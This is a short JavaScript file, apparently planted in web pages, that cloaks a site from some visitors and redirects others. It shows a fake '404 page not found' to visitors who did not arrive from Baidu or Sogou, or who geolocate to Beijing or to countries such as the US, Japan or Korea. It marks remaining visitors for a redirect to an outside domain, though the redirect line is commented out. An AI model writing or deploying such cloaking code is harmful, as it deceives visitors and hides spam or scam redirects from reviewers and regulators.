var jumptoUrl = 'http://a98388.com/';

function show404HTML(from) {
  console.log('show 404 from ',from);
  document.title = "404 出错了，页面未找到";
  var body = document.querySelector("body");
  var html = `
  <div style="width: 50%;  height: 300px;  line-height: 300px;  font-size: 35px;  text-align: center;  display: block;  overflow: hidden;  clear: both;  border-radius: 1%;
  background-color: #b9e8ff;  margin: 10% auto; border: 1px solid #9fd9f5;">404 出错了，页面未找到</div>
  `;
  if (body) {
    body.innerHTML = html;
  } else {
    document.write(html);
  }
}

function checkfun() {
  var s = document.referrer || "";
  var host = document.domain || window.location.host || "";
  console.log("document.referrer=", s);
  console.log("host=", host);
  if (s.indexOf("baidu") == -1 && s.indexOf("sogou") == -1) {
    show404HTML(1);
    return;
  }
  try {
    checkCity(function (isEnable) {
      if (isEnable) {
        // window.location.href = jumptoUrl;
        console.log('跳转了。。。')
      }else{
        show404HTML(2);
      }
    });
  } catch (e) {
    show404HTML(3);
    console.log(e);
  }
}

function checkCity(cb) {
  jQuery.getScript("https://pv.sohu.com/cityjson?ie=utf-8", function () {
    var city = returnCitySN["cname"];
    var cid = returnCitySN["cid"];
    console.log('city',city);
    console.log('cid',cid);
    if (cid == 'PH' || cid == 'JP' || cid == 'US' || cid == 'RO' || cid == 'EU' || cid == 'KR' || cid == '810000' || city.indexOf("北京") != -1) {
      return cb(false);
    }
    if (!isNaN(cid) && city.indexOf("北京") == -1) {
      return cb(true);
    }
    cb(cid == 'CN');
  });
}
function addScript(url, cb) {
  var bp = document.createElement("script");
  bp.type = "text/javascript";
  var curProtocol = window.location.protocol.split(":")[0];
  if (curProtocol === "https") {
    bp.src = "https://" + url;
  } else {
    bp.src = "http://" + url;
  }
  document.getElementsByTagName('body')[0].appendChild(bp);
  bp.onload = function () {
    // 执行相应的函数
    if (cb) cb();
  }
}


try {
  if (!jQuery) {
    addScript("cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js");
  }
} catch (e) {
  console.log("jquery未加载，现在加载");
  addScript("cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js");
}
// checkfun();
setTimeout(checkfun, 500);
